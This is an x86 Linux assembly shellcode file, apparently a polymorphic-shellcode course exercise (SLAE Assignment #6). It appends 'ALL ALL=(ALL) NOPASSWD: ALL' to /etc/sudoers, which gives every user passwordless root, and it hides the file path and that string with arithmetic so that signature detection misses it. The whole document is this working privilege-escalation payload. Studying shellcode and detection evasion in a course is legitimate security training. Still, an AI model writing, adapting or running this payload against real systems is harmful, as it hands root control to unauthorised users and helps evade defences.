; Author: John Stigerwalt
; SLAE: Assignment #6
; Shellcode: Polymorphic Version - Sudo with root access no pass
;

section .text

global _start

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	;xor eax, eax
        xor ecx, ecx
	;push eax               ; push null to stack
        push ecx

        mov esi, 0x01010101
        mov edi, 0x7271646e
           ;push 0x7372656f        ; /etc/sudoers
        add edi, esi
        push edi
        

        mov edi, 0x6374722e
	   ;push 0x6475732f
        add edi, esi
        push edi

        mov edi, 0x6273642e
	   ;push 0x6374652f
        add edi, esi
        push edi

	mov ebx, esp           ; set /etc/sudoers to ebx - 2nd arg for open

	mov cx, 0x401 ;       ; file access bits 0x401: 400 = APPEND | 01 = WRONLY

        push byte 0x05
        pop eax
	;mov al, 0x05          ; sys_call open - 0x5 - 1st arg for open

	int 0x80

	mov ebx, eax           ; file descriptor returned from open sys_call - 2nd arg of write 


	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);

	;xor eax, eax
        xor ecx, ecx

	;push eax               ; Null out stack for push dword method\
        push ecx
        
        mov edi, 0x094b4b40
           ;push 0x0a4c4c41        ; ALL ALL=(ALL) NOPASSWD: ALL
        add edi, esi
        push edi

        mov esi, 0x10101010
        mov edi, 0x102a3447
           ;push 0x203a4457   
        add edi, esi
        push edi

        
        mov edi, 0x43433140
	   ;push 0x53534150
        add edi, esi
        push edi

        mov edi, 0x3f3e1019
	   ;push 0x4f4e2029
        add edi, esi
        push edi

        mov edi, 0x3c3c3118
	   ;push 0x4c4c4128
        add edi, esi
        push edi

        mov edi, 0x2d3c3c31
           ;push 0x3d4c4c41
        add edi, esi
        push edi


        mov edi, 0x103c3c31
	   ;push 0x204c4c41
        add edi, esi
        push edi

	mov ecx, esp           ;move ALL ALL=(ALL) NOPASSWD: ALL from stack to ecx - 3rd arg

	;;; May need a push NULL on stack here ;;;
        ;xor edx, edx
        ;push edx
        
        push byte 0x1c
        pop edx
        ;mov dl, 0x1c           ; 0x1c = 28, max characters to write to file - 4th arg
        push byte 0x04
        pop eax
	;mov al, 0x04           ; 0x04 syscall write - 1st arg
	int 0x80

	;close(file)
	;push byte 0x06
	;pop eax
	;save some bytes here:
	inc eax
	inc eax
	;mov al, 0x06           ; 0x06 syscall - close file
	int 0x80

	;exit(0);
	xor ebx, ebx
	; Save some bytes here:
	xchg eax, ebx
	inc eax
        ;push byte 0x01
        ;pop eax
	;mov al, 0x01           ; 0x01 syscall exit - exit process
	int 0x80
